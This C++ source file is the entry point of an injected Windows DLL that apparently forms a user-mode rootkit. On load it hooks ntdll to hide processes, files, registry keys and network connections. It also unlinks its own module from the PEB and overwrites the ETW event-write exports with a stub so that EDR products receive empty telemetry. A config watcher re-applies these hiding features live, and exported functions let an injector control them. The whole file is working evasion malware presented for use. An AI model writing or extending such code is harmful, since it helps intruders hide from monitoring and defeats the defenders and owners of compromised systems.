/*
 * dllmain.cpp - Entry point, bootstrap and runtime configuration watcher.
 *
 * Sequence when the DLL is mapped into a host process:
 *
 *   1. DllMain spins up a bootstrap thread (never do this work under the
 *      loader lock) and returns to let the process continue loading.
 *   2. The bootstrap thread loads rk.ini, installs the ntdll-backed hooks
 *      (process / file / registry), then the optional ones (network,
 *      ETW, PEB module hiding).
 *   3. A watcher thread polls the ini file. When it changes, the config
 *      is reloaded and the configuration-dependent pieces are re-applied
 *      live (no restart, no re-injection).
 *
 * Anything that only depends on ntdll can be installed immediately.
 * iphlpapi is usually not loaded when a process starts, so the network
 * installer is retried from the watcher until the module appears.
 *
 * The hooks stay installed for the whole process lifetime. There is no
 * uninstall path because restoring a prologue while other threads are
 * executing inside the trampoline is strictly worse than leaving it;
 * process teardown removes everything with the address space.
 */
#include "rkhooks.h"
#include "api.h"
#include "../common/config.h"
#include "../common/hook.h"

#include <windows.h>
#include <string.h>

#define RK_WATCH_INTERVAL_MS 2000
#define RK_NET_RETRY_LIMIT   300     /* ~10 minutes at 2 s */

/* ================================================================== */
/* ETW disarm                                                          */
/* ================================================================== */

/*
 * Replace the body of the ETW write helpers with "xor eax, eax; ret".
 * ETW write routines return an NTSTATUS/ULONG where 0 means success, so
 * every telemetry consumer observes a clean, empty event write: no
 * exception, no partial buffer, nothing for an EDR consumer to flag as a
 * failure. Patching ntdll's own exports covers the vast majority of
 * writers (most user-mode ETW logging funnels through them).
 */
static void rk_patch_etw_export(const char *name)
{
    unsigned char patch[3] = { 0x33, 0xC0, 0xC3 };  /* xor eax,eax ; ret */
    void  *p;
    DWORD  old = 0;

    p = rk_proc(L"ntdll.dll", name);
    if (!p)
        return;

    if (!VirtualProtect(p, sizeof(patch), PAGE_EXECUTE_READWRITE, &old))
        return;

    memcpy(p, patch, sizeof(patch));
    FlushInstructionCache(GetCurrentProcess(), p, sizeof(patch));
    VirtualProtect(p, sizeof(patch), old, &old);
}

static volatile LONG g_etw_done = 0;

static void rk_disable_etw(void)
{
    if (InterlockedExchange(&g_etw_done, 1))
        return;

    rk_patch_etw_export("EtwEventWrite");
    rk_patch_etw_export("EtwEventWriteEx");
    rk_patch_etw_export("EtwEventWriteFull");
    rk_patch_etw_export("EtwEventWriteNoRegistration");
    rk_patch_etw_export("EtwEventWriteString");
    rk_patch_etw_export("EtwEventWriteTransfer");
}

/* ================================================================== */
/* Core install                                                        */
/* ================================================================== */

extern "C" void rk_hooks_install_core(void)
{
    /*
     * Each installer is idempotent: a second call after a live config
     * change is a no-op, so the watcher can safely re-run this.
     */
    rk_hide_process_install();
    rk_hide_file_install();
    rk_hide_registry_install();
}

/* ================================================================== */
/* Config-driven re-application                                        */
/* ================================================================== */

static void rk_apply_config(const rk_config *cfg)
{
    if (cfg->module_count)
        rk_hide_peb_modules();

    if (cfg->self_hide)
        rk_hide_peb_self();

    if (cfg->disable_etw)
        rk_disable_etw();
}

/* ================================================================== */
/* Threads                                                             */
/* ================================================================== */

static DWORD WINAPI RkWatcherThread(LPVOID param)
{
    (void)param;

    for (;;)
    {
        rk_config cfg;

        Sleep(RK_WATCH_INTERVAL_MS);

        /* Poll the timestamp, not the file itself: a reload is only
         * needed when a rule actually changed. */
        if (rk_config_changed() && rk_config_load(&cfg) == 0)
            rk_apply_config(&cfg);
    }
}

static DWORD WINAPI RkBootstrapThread(LPVOID param)
{
    rk_config cfg;
    int       attempts = 0;
    HANDLE    watcher;

    (void)param;

    rk_config_load(&cfg);

    /* ntdll-only surfaces first: they work no matter what else loads. */
    rk_hooks_install_core();
    rk_apply_config(&cfg);

    /* Network tables need iphlpapi, which is not loaded in a fresh
     * process. Keep retrying until it shows up and gets hooked. */
    while (rk_hide_network_install() != 0)
    {
        if (++attempts >= RK_NET_RETRY_LIMIT)
            break;
        Sleep(RK_WATCH_INTERVAL_MS);
    }

    watcher = CreateThread(NULL, 0, RkWatcherThread, NULL, 0, NULL);
    if (watcher)
        CloseHandle(watcher);

    return 0;
}

/* ================================================================== */
/* Exported control surface (used by the injector / tests)             */
/* ================================================================== */

extern "C" __declspec(dllexport) void RkReload(void)
{
    rk_config cfg;

    if (rk_config_load(&cfg) == 0)
        rk_apply_config(&cfg);
}

extern "C" __declspec(dllexport) void RkHideSelfNow(void)
{
    rk_hide_peb_self();
}

extern "C" __declspec(dllexport) int RkInstallNetwork(void)
{
    return rk_hide_network_install();
}

extern "C" __declspec(dllexport) int RkInstallCore(void)
{
    rk_hooks_install_core();
    return 0;
}

/* ================================================================== */
/* DllMain                                                             */
/* ================================================================== */

BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved)
{
    (void)reserved;

    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
    {
        HANDLE t;

        DisableThreadLibraryCalls(inst);

        /* Work is deferred: hook engine setup takes locks, allocates in
         * the target process and suspends threads, none of which is legal
         * under the loader lock. */
        t = CreateThread(NULL, 0, RkBootstrapThread, NULL, 0, NULL);
        if (t)
            CloseHandle(t);
        break;
    }

    case DLL_PROCESS_DETACH:
        /* Hooks are intentionally left in place; the address space is
         * going away and a partial restore would race exiting threads. */
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    default:
        break;
    }

    return TRUE;
}
